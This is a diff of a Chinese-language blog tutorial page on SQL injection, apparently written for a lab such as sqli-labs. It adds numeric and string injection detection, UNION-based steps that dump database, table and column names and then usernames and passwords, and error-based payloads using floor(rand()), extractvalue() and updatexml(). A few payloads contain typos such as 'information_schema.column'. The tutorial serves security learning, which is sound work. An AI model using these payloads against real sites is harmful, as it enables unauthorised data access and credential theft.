@@ -16,12 +16,12 @@
   <meta name="author" content="Englobe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="sql注入联合查询（union注入）报错注入 group by 重复键冲  and (select 1 from (select count(*),concat((select 查询的内容 from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a)">
+    <meta name="description" content="sql注入数字型：当输入的参数为整形时，若存在注入漏洞，则是数字型注入。 如：https:&#x2F;&#x2F;blog.csdn.net&#x2F;aboutus.php?id&#x3D;1 此时后台语句：$sql&#x3D;“SELECT 123 FROM abc WHERE id&#x3D;’1 ‘“ 检测方法：URL输入 and 1&#x3D;1 &#x2F; and 1&#x3D;2 报错则说明有注入 字符型当输入参数为字符">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sql注入">
 <meta property="og:url" content="http://example.com/2023/04/19/sql%E6%B3%A8%E5%85%A5/sql/index.html">
 <meta property="og:site_name" content="Englobe blog">
-<meta property="og:description" content="sql注入联合查询（union注入）报错注入 group by 重复键冲  and (select 1 from (select count(*),concat((select 查询的内容 from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a)">
+<meta property="og:description" content="sql注入数字型：当输入的参数为整形时，若存在注入漏洞，则是数字型注入。 如：https:&#x2F;&#x2F;blog.csdn.net&#x2F;aboutus.php?id&#x3D;1 此时后台语句：$sql&#x3D;“SELECT 123 FROM abc WHERE id&#x3D;’1 ‘“ 检测方法：URL输入 and 1&#x3D;1 &#x2F; and 1&#x3D;2 报错则说明有注入 字符型当输入参数为字符">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/2023/04/19/sql%E6%B3%A8%E5%85%A5/sql/f24cdf11d12a955e5740996b44dd20d8.png">
 <meta property="og:image" content="http://example.com/2023/04/19/sql%E6%B3%A8%E5%85%A5/sql/f881db8992c8beb5993dc652c3ccb334.png">
@@ -226,7 +226,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          5.6k 字
+          7.3k 字
         
       </span>
     
@@ -237,7 +237,7 @@
         
         
         
-          47 分钟
+          61 分钟
         
       </span>
     
@@ -288,27 +288,71 @@
             
               <div class="markdown-body">
                 
-                <h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="联合查询（union注入）"><a href="#联合查询（union注入）" class="headerlink" title="联合查询（union注入）"></a>联合查询（union注入）</h3><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><ol>
+                <h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="数字型："><a href="#数字型：" class="headerlink" title="数字型："></a>数字型：</h3><p>当输入的参数为整形时，若存在注入漏洞，则是数字型注入。</p>
+<p>如：<a target="_blank" rel="noopener" href="https://blog.csdn.net/aboutus.php?id=1">https://blog.csdn.net/aboutus.php?id=1</a></p>
+<p>此时后台语句：$sql&#x3D;“SELECT 123 FROM abc WHERE id&#x3D;’1 ‘“</p>
+<p>检测方法：URL输入 and 1&#x3D;1 &#x2F; and 1&#x3D;2 报错则说明有注入</p>
+<h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><p>当输入参数为字符串时，称为字符型注入。</p>
+<p>它与数字型的区别：数字型不需要单引号来闭合，而字符串需要单引号来闭合。</p>
+<p>例：<a target="_blank" rel="noopener" href="https://blog.csdn.net/aboutus.php?id=1%E2%80%99">https://blog.csdn.net/aboutus.php?id=1’</a></p>
+<p>此时后台语句：$sql&#x3D;“SELECT 123 FROM abc WHERE id&#x3D;’1 ’ ’ “</p>
+<p>此时多出了一个单引号，破坏了原本的SQL语句结构，数据库无法处理，于是会报错，证明这条语句成功被带进数据库查询,存在字符型注入。</p>
+<p>此时通过 –+把后面的单引号注释掉，SQL语句也会形成闭合。</p>
+<h3 id="联合查询（union注入）"><a href="#联合查询（union注入）" class="headerlink" title="联合查询（union注入）"></a>联合查询（union注入）</h3><p>联合查询适合于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化。</p>
+<p>页面观察<br>输入id&#x3D;1和id&#x3D;2，若页面中值有变化，说明输入与数据库有交互</p>
+<p>注入点判断<br>直接输入?id&#x3D;1’若有报错则存在注入，开始判断可以从哪里注入，?id&#x3D;2’1&#x3D;2–+页面显示不正常，说明此处存在SQL注入，注入点在引号。</p>
+<p>接下来开始使用SQL语句进行攻击。</p>
+<p>使用order by判断当前表的字段个数<br>例：?id&#x3D;1 order by n –+</p>
+<p>若n超过当前表的列数，就会报错，说明表中只有n-1列</p>
+<p>判断显示位<br>判断显示位时，要使用 ?id&#x3D;-1 或者改为0 让前面的select语句查询为空错误，然后采用后面的select语句去查询：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span>’ <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+<p>观察页面在哪里回显我们的输入，就可以用那个地方测试接下的语句。</p>
+<p>爆数据库的名字</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span>’ <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-keyword">database</span>() <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+<p>在之前回显2的地方会回显database数据库的名字。</p>
+<p>爆数据库中的表</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span>’ <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+<p>爆表中的字段</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span>’ <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">column</span> <span class="hljs-keyword">where</span> table_schema=’爆出来的数据库名‘ <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=‘爆出来的表名’ <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+<p>爆相应字段的所有数据</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">-1</span>’ union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">id</span>,’–‘,username,’–&#x27;,password) <span class="hljs-keyword">from</span> users <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>在mysql中使用指定函数来制造报错，查询的时候加一些格式错误的信息，它会提示你格式错误，可以在中间加入一些其他信息，比如select database(),报错信息后面也会出现数据库信息.</p>
+<ol>
 <li><p>group by 重复键冲</p>
-<p> and (select 1 from (select count(*),concat((select 查询的内容 from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) –+</p>
+ <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> count(*),concat((<span class="hljs-keyword">select</span> 查询的内容 <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),floor(rand()*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">table</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
 </li>
-</ol>
-<p>?id&#x3D;1’ and (select 1 from (select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) –+</p>
-<ol start="2">
 <li><p>extractvalue() 函数</p>
-<p> ?id&#x3D;1’ and extractvalue(1,concat(‘^’,(select database()),’^’)) –+</p>
+<p> extractvalue(xml_frag,xpath_expr)；</p>
+<p> 函数接受两个参数，第一个为XML标记内容，也就是查询的内容，第二个为XPATH路径，也就是查询的路径。</p>
+<p> 如果没有匹配的内容，不管出于何种原因，只要路径有效并且查询的内容由正确嵌套和关闭的元素组成，返回空字符串。</p>
+<p> 但如果路径写入错误格式，就会报错并且返回我们写入的非法内容。</p>
+ <figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;^&#x27;</span>,(<span class="hljs-keyword">select</span> database()),<span class="hljs-string">&#x27;^&#x27;</span>)) *<span class="hljs-comment">--+//获取数据库名字*</span><br></code></pre></td></tr></table></figure>
 </li>
 <li><p>updatexml() 函数</p>
+<p> updatexml(xml_target,xpath_expr,new_xml)；</p>
+<p> 此函数将XML标记的给定片段的单个部分替换为xml_target新的XML片段new_xml，然后返回更改的XML。</p>
+<p> xml_target替换的部分 与xpath_expr 用户提供的XPath表达式匹配。如果未xpath_expr找到表达式匹配 ，或者找到多个匹配项，则该函数返回原始 xml_targetXML片段。</p>
+<p> 所有三个参数都应该是字符串。与extractvalue()类似，如果XPATH写入错误格式，就会报错，并且返回我们写入的非法内容。</p>
 <p> and updatexml(1,concat(‘^’,(需要查询的内容),’^’),1)</p>
 </li>
 </ol>
-<p>获取数据库名字<br>?id&#x3D;1’ and updatexml(1,concat(‘^’,(database()),’^’),1) –+</p>
+<p>获取数据库名字</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> updatexml(1,concat(<span class="hljs-string">&#x27;^&#x27;</span>,(database()),<span class="hljs-string">&#x27;^&#x27;</span>),1) --+<br></code></pre></td></tr></table></figure>
+
 <p>获取当前数据库中表的名字</p>
-<p>?id&#x3D;1’ and updatexml(1,concat(‘^’,(select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 0,1),’^’),1) –+</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> updatexml(1,concat(<span class="hljs-string">&#x27;^&#x27;</span>,(select table_name <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span> limit 0,1),<span class="hljs-string">&#x27;^&#x27;</span>),1) --+<br></code></pre></td></tr></table></figure>
+
 <p>在 table_schema&#x3D;’security’ 后加上 limit 0,1，显示第一行（显示第0行的往下一行，不包括第0行）如果要看第二行则，limit1,1（第一行的往下一行，不包括第一行，即显示第二行），看第三行则limit2,1。</p>
 <p>爆表中的字段</p>
-<pre><code class="hljs">?id=1&#39; and updatexml(1,concat(&#39;^&#39;,(select column_name from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39; limit 0,1 ),&#39;^&#39;),1) --+
-</code></pre>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> updatexml(1,concat(<span class="hljs-string">&#x27;^&#x27;</span>,(select column_name <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span> limit 0,1 ),<span class="hljs-string">&#x27;^&#x27;</span>),1) --+<br></code></pre></td></tr></table></figure>
+
 <p>爆字段中的内容</p>
 <pre><code class="hljs">?id=1&#39; and updatexml(1,concat(&#39;^&#39;,(select group_concat(username,&quot;--&quot;,password) from users limit 0,1 ),&#39;^&#39;),1) --+
 </code></pre>
